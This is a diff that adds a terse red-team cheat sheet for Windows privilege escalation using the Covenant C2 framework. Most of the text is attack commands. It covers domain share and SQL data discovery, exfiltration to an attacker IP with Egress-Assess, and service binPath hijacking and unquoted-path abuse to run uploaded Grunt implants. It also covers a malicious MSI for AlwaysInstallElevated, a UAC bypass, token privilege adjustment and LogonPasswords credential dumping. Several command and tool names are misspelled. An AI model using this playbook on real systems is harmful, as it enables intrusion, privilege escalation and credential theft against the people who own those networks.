@@ -1,0 +1,89 @@
+# Escalation
+https://github.com/rasta-mouse/Watson
+https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
+https://github.com/GhostPack/SharpUp
+
+#SMB
+
+#Covenant
+WhoAmI
+PowerShell Find-DomainShare -CheckAccess
+PowerShell Find-InterestingDomainShareFile -Include *admin*
+PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ? { $_.Status -eq 'Accessible' } | Get-SQLColumnSampleDataThreaded -SampleSize 5 -Keywords 'student,name' -NoDefaults | select instance, database, column, sample | ft -autosize
+------------
+#Exfiltration ( “dummy data” )
+PowerShell Invoke-EgressAssess -Client http -DataType ni -IP 10.8.0.x -Port 8080 -NoPing
+https://github.com/FortyNorthSecurity/Egress-Assess
+Egress-Assess.py --server http --server-port 8080
+
+#Servicies windows
+services.msc
+sc query
+Get-Service | Format-List
+
+#Weak Service Permissions
+From Covenant:
+SharpUp
+Import PowerShellImport Get-ServiceAcl.ps1
+PowerShell 'SERVICE' | Get-ServiceAcl | Select-Object -ExpandProperty Access
+Upload /filepath:"C:\Windows\Temp\GruntSMB_svc.exe"
+Shell sc config "service" binPath= "C:\Windows\Temp\GruntSMB"
+Shell sc qc "service"
+Shell sc stop "service"
+shell sc start "service"
+shell sc start "service"
+connect localhost namesmbgrunt
+
+#Unquoted Service Paths
+An unquoted service path is where the path to the service binary is not wrapped in quotes.
+wmic service get name, pathname
+shell wmic service get name. pathname
+PowerShell Get-Acl -Path C:\ | Format-List
+PowerShell Get-Acl -Path "C:\Program Files\program" | f1
+upload a file to path
+powershell stop-service
+powershell start-service
+connect localhost namesmbgrunt
+
+#Always Install Elevated
+SharUp
+=== AlwaysInstallElevated Registry Keys === 
+  HKLM: 1 
+  HKCU: 1
+GruntSmb
+VisualStudio + Setup Project + Target Platform x86 + Add File + Grunt + View Custom Actions + InstallerClass False Run64b True + Net Framewrok 4.0 + save + build
+pwd
+upload gruntinstaller.msi
+shell msiexec /i: G:\Destkop\gruntinstaller.msi /qn
+connect localhost namesmbgruntsvc
+
+#UAC Bypass
+BypassUACGrunt powershell
+whoami /groups
+BUILTIN\Administrators
+Mandatory Label\Medium Mandatory Level
+SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"
+ps
+LogonPasswords
+Setabelt TokenPrivileges
+AdjustTokenPrivileges
+psexec localhost servicebinary
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
